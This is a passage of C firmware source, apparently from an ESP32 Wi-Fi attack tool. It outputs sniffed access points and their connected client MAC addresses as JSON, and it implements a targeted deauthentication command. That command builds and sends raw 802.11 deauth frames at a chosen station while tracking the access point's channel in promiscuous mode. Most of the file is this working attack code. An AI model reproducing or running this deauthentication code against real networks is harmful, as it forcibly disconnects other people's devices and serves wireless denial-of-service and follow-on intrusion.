/* Opt-in identity API. Included after sniffer_take_snapshot in main.c.
 * Legacy commands and legacy AP/station selections deliberately stay independent. */
static bool sniffer_identity_mac(const char *text, uint8_t mac[6])
{
    if (!text || strlen(text) != 17) return false;
    for (int i = 0; i < 6; ++i) {
        int a = text[3*i], b = text[3*i+1];
        a = a >= '0' && a <= '9' ? a-'0' : a >= 'A' && a <= 'F' ? a-'A'+10 : a >= 'a' && a <= 'f' ? a-'a'+10 : -1;
        b = b >= '0' && b <= '9' ? b-'0' : b >= 'A' && b <= 'F' ? b-'A'+10 : b >= 'a' && b <= 'f' ? b-'a'+10 : -1;
        if (a < 0 || b < 0 || (i < 5 && text[3*i+2] != ':')) return false;
        mac[i] = (a << 4) | b;
    }
    static const uint8_t zero[6];
    return !(mac[0] & 1) && memcmp(mac, zero, 6);
}

static void sniffer_identity_mac_text(char text[18], const uint8_t mac[6])
{
    snprintf(text, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

static const char *sniffer_identity_name(const sniffer_ap_t *ap, char hex[65])
{
    const uint8_t *name = ap->identity_scan_ssid;
    size_t len = ap->identity_scan_len;
    const char *source = len ? "scan" : "none";
    if (ap->extended.resolved_len && ap->extended.ssid_source != SX_NONE) {
        name = ap->extended.resolved_ssid; len = ap->extended.resolved_len;
        switch (ap->extended.ssid_source) {
            case SX_BEACON: source = "beacon"; break;
            case SX_PROBE_RESP: source = "probe_response"; break;
            case SX_ASSOC_REQ: source = "association"; break;
            case SX_REASSOC_REQ: source = "reassociation"; break;
            default: source = "none"; len = 0; break;
        }
    }
    if (len > 32) len = 32;
    for (size_t i = 0; i < len; ++i) snprintf(hex + i*2, 3, "%02X", name[i]);
    hex[len*2] = 0;
    return source;
}

static int sniffer_identity_error(const char *record, const char *reason)
{
    printf("{\"schema_version\":1,\"record_type\":\"%s\",\"status\":\"error\",\"reason\":\"%s\"}\n", record, reason);
    fflush(stdout);
    return 1;
}

static int cmd_show_sniffer_clients(int argc, char **argv)
{
    (void)argv;
    if (argc != 1) return sniffer_identity_error("sniffer_clients", "invalid_arguments");
    int count = 0, aps = 0, clients = 0;
    uint32_t now;
    sniffer_ap_t *snapshot = sniffer_take_snapshot(&count, &now);
    if (!snapshot) return sniffer_identity_error("sniffer_clients", "no_memory");
    for (int i = 0; i < count; ++i) {
        const sniffer_ap_t *ap = &snapshot[i];
        if (!ap->client_count || is_broadcast_bssid(ap->bssid) || is_own_device_mac(ap->bssid)) continue;
        ++aps; clients += ap->client_count;
    }
    printf("{\"schema_version\":1,\"record_type\":\"sniffer_clients_begin\",\"aps\":%d,\"clients\":%d}\n", aps, clients);
    for (int i = 0; i < count; ++i) {
        const sniffer_ap_t *ap = &snapshot[i];
        if (!ap->client_count || is_broadcast_bssid(ap->bssid) || is_own_device_mac(ap->bssid)) continue;
        char bssid[18], hex[65];
        sniffer_identity_mac_text(bssid, ap->bssid);
        const char *source = sniffer_identity_name(ap, hex);
        printf("{\"schema_version\":1,\"record_type\":\"sniffer_ap\",\"bssid\":\"%s\",\"channel\":%u,\"ssid_hex\":\"%s\",\"ssid_source\":\"%s\"}\n",
               bssid, ap->identity_channel, hex, source);
        for (int j = 0; j < ap->client_count; ++j) {
            char station[18]; sniffer_identity_mac_text(station, ap->clients[j].mac);
            printf("{\"schema_version\":1,\"record_type\":\"sniffer_client\",\"bssid\":\"%s\",\"station\":\"%s\"}\n", bssid, station);
            vTaskDelay(1);
        }
        vTaskDelay(1);
    }
    free(snapshot);
    printf("{\"schema_version\":1,\"record_type\":\"sniffer_clients_end\",\"aps\":%d,\"clients\":%d}\n", aps, clients);
    fflush(stdout);
    return 0;
}

/* During this mode only, passive channel checks avoid the legacy scan cache.
 * Callback never writes legacy identity or performs UART/driver calls. */
static atomic_uchar sniffer_station_observed_channel;
static void sniffer_station_rx(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!sniffer_station_direct_active || !buf || type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = buf;
    size_t len = pkt->rx_ctrl.sig_len;
    if (pkt->rx_ctrl.rx_state || len < 40 ||
        (pkt->rx_ctrl.dump_len && pkt->rx_ctrl.dump_len < len - 4)) return;
    sx_observation_t observation;
    if (!sx_parse(pkt->payload, len-4, &observation) || !observation.complete ||
        (observation.source != SX_BEACON && observation.source != SX_PROBE_RESP) ||
        memcmp(observation.bssid, sniffer_station_direct_target.bssid, 6)) return;
    sniffer_station_observed_channel = pkt->rx_ctrl.channel;
}

static void sniffer_station_cleanup(void)
{
    if (!sniffer_station_direct_active) return;
    sniffer_station_direct_active = false;
    esp_wifi_set_promiscuous(false);
}

static void sniffer_station_send(void)
{
    if (operation_stop_requested || !sniffer_station_direct_active) return;
    if (sniffer_station_observed_channel)
        sniffer_station_direct_target.channel = sniffer_station_observed_channel;
    if (esp_wifi_set_channel(sniffer_station_direct_target.channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) return;
    uint8_t frame[sizeof(deauth_frame_default)];
    memcpy(frame, deauth_frame_default, sizeof(frame));
    memcpy(frame+4, sniffer_station_direct_mac, 6);
    memcpy(frame+10, sniffer_station_direct_target.bssid, 6);
    memcpy(frame+16, sniffer_station_direct_target.bssid, 6);
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}

static void sniffer_station_monitor(void)
{
    sniffer_station_observed_channel = 0;
    for (int i = 0; i < dual_band_channels_count && !operation_stop_requested &&
                    deauth_attack_active; ++i) {
        if (esp_wifi_set_channel(dual_band_channels[i], WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
        vTaskDelay(pdMS_TO_TICKS(150));
        if (sniffer_station_observed_channel) break;
    }
    /* If AP wasn't heard, retain the last known BSSID/channel. */
    if (sniffer_station_observed_channel)
        sniffer_station_direct_target.channel = sniffer_station_observed_channel;
    esp_wifi_set_channel(sniffer_station_direct_target.channel, WIFI_SECOND_CHAN_NONE);
}

static int cmd_start_deauth_station(int argc, char **argv)
{
    uint8_t bssid[6], station[6];
    if (argc != 3 || !sniffer_identity_mac(argv[1], bssid) ||
        !sniffer_identity_mac(argv[2], station) || !memcmp(bssid, station, 6))
        return sniffer_identity_error("station_deauth", "invalid_arguments");
    if (!sniffer_data_mutex || !target_bssids || !sniffer_aps)
        return sniffer_identity_error("station_deauth", "not_ready");
    target_bssid_t target = {0};
    bool found = false;
    xSemaphoreTake(sniffer_data_mutex, portMAX_DELAY);
    for (int i = 0; i < sniffer_ap_count && !found; ++i) {
        const sniffer_ap_t *ap = &sniffer_aps[i];
        if (memcmp(ap->bssid, bssid, 6)) continue;
        for (int j = 0; j < ap->client_count; ++j) {
            if (memcmp(ap->clients[j].mac, station, 6)) continue;
            memcpy(target.bssid, bssid, 6);
            target.channel = ap->identity_channel;
            target.active = true;
            snprintf(target.ssid, sizeof(target.ssid), "%s", ap->ssid);
            found = true; break;
        }
    }
    xSemaphoreGive(sniffer_data_mutex);
    if (!found) return sniffer_identity_error("station_deauth", "client_not_found");
    bool valid_channel = false;
    for (int i = 0; i < dual_band_channels_count; ++i)
        if (target.channel == dual_band_channels[i]) valid_channel = true;
    if (!valid_channel) return sniffer_identity_error("station_deauth", "channel_unknown");
    if (is_own_device_mac(bssid) || is_own_device_mac(station))
        return sniffer_identity_error("station_deauth", "invalid_target");
    /* No selection or scan writes here, including after a previous legacy attack. */
    if (cmd_stop(0, NULL) != 0) return sniffer_identity_error("station_deauth", "stop_failed");
    if (!ensure_wifi_mode()) return sniffer_identity_error("station_deauth", "radio_error");
    if (esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE) != ESP_OK)
        return sniffer_identity_error("station_deauth", "channel_unavailable");
    sniffer_station_direct_target = target;
    memcpy(sniffer_station_direct_mac, station, 6);
    sniffer_station_observed_channel = 0;
    operation_stop_requested = false;
    sniffer_station_direct_active = true;
    if (esp_wifi_set_promiscuous_filter(&sniffer_filter) != ESP_OK ||
        esp_wifi_set_promiscuous_rx_cb(sniffer_station_rx) != ESP_OK ||
        esp_wifi_set_promiscuous(true) != ESP_OK) {
        sniffer_station_cleanup();
        return sniffer_identity_error("station_deauth", "radio_error");
    }
    applicationState = DEAUTH;
    deauth_attack_active = true;
    last_channel_check_time = esp_timer_get_time() / 1000;
    if (xTaskCreate(deauth_attack_task, "deauth_task", 4096, NULL, 5,
                    &deauth_attack_task_handle) != pdPASS) {
        deauth_attack_active = false; deauth_attack_task_handle = NULL;
        applicationState = IDLE;
        sniffer_station_cleanup();
        return sniffer_identity_error("station_deauth", "no_memory");
    }
    char ap_text[18], sta_text[18];
    sniffer_identity_mac_text(ap_text, bssid); sniffer_identity_mac_text(sta_text, station);
    printf("{\"schema_version\":1,\"record_type\":\"station_deauth\",\"status\":\"started\",\"bssid\":\"%s\",\"station\":\"%s\"}\n", ap_text, sta_text);
    fflush(stdout);
    return 0;
}
